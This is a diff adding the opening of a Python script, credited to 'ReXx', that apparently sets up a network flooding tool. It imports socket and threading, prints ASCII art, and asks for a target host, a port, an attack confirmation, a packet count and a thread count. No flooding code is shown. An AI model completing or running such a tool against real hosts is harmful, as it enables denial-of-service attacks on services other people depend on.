@@ -1,0 +1,25 @@
+#Codes : ReXx
+#Mau Rename Dek? 
+import random
+import socket
+import threading
+import os
+import sys
+
+os.system("clear")
+print("""\033[95m
+
+▇◤▔▔▔▔▔▔▔◥▇
+▇▏◥▇◣┊◢▇◤▕▇
+▇▏▃▆▅▎▅▆▃▕▇
+▇▏╱▔▕▎▔▔╲▕▇
+▇◣◣▃▅▎▅▃◢◢▇
+▇▇◣◥▅▅▅◤◢▇▇
+▇▇▇◣╲▇╱◢▇▇▇ 
+By : ReXxV8""")
+
+ip = str(input(" Host Or Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" Already Ready Attack?(y/n):"))
+times = int(input(" Package:"))
+threads = int(input(" Threads:"))
